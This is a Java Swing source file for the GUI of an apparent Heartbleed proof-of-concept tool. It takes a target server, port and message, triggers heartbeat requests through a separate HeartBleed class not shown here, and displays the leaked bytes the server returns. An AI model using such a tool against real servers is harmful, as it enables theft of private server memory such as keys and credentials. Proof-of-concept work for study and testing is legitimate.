import javax.swing.*;

import java.awt.BorderLayout;
import java.awt.event.*;
import java.io.IOException;

public class hbEvent extends JFrame{
	
	HeartBleed mainBleed = new HeartBleed();
	
	private String jTextContent ="";
	
	private JPanel panel;
	private JPanel panelEast;
	
	private JLabel server;
	private JLabel port;
	private JLabel message;
	private JLabel continuous;
	private JLabel iterations;
	
	private JButton connect;
	private JButton go;
	private JButton save;
	
	private JTextField serverField;
	private JTextField portField;
	private JTextField iterationsField;
	private JTextField messageField;
	
	private JCheckBox contBox;
	
	private JTextArea output;
	private JScrollPane scrollOutput;
	
	private final int WIDTH = 800;
	private final int HEIGHT = 800;
	
	public hbEvent(){
		super("HeartBleed Proof of Concept");
		
		setSize(WIDTH,HEIGHT);
		
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		
		buildPanel();
		add(panel);

		
		setVisible(true);
	}
	
	private void buildPanel(){
		panel = new JPanel();
		panelEast = new JPanel();
		
		//for quick adding
		JComponent[] westComp = {
				server, serverField,
				port, portField,
				message, messageField,
				continuous, contBox,
				iterations, iterationsField,
				connect, save
				};
		
		server = new JLabel("Server:");
		port = new JLabel("Port:");
		message = new JLabel("Message: ");
		continuous = new JLabel("Continous mode?");
		iterations = new JLabel("# iterations");
		
		serverField = new JTextField(10);
		portField = new JTextField(3);
		iterationsField = new JTextField(3);
		messageField = new JTextField(10);
		
		contBox = new JCheckBox();
		
		connect = new JButton("Connect");
		connect.addActionListener(new connectionListener());
		go = new JButton("Go");
		go.addActionListener(new goListener());
		save = new JButton("Save");
		
		output = new JTextArea(40,60);
		output.setLineWrap(true);
		scrollOutput = new JScrollPane(output);

		
		
		
		panel.add(server);
		panel.add(serverField);
		panel.add(port);
		panel.add(portField);
		panel.add(message);
		panel.add(messageField);
		panel.add(continuous);
		panel.add(contBox);
		panel.add(iterations);
		panel.add(iterationsField);
		panel.add(connect);
		panel.add(go);
		panel.add(save);

		//panel.add(output);
		panel.add(scrollOutput);
		
	}
	
	private class connectionListener implements ActionListener{
		
		public void actionPerformed(ActionEvent ev){
			
			String server = serverField.getText();
			int port = Integer.parseInt(portField.getText());
			String message = messageField.getText();
			
			try{
				mainBleed.connect(server, port);
				mainBleed.hello();
			}
			catch(IOException e){
				//add exception
				e.printStackTrace();
			}
		}
	}
	
	private class goListener implements ActionListener{
		
		public void actionPerformed(ActionEvent ev){
			try {
				
				mainBleed.heartBeat(messageField.getText());
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			String decoded = new String(mainBleed.getBytes());
			
			//append the 
			jTextContent = jTextContent + decoded;
			
			output.append(decoded);
		}
	}
	
}
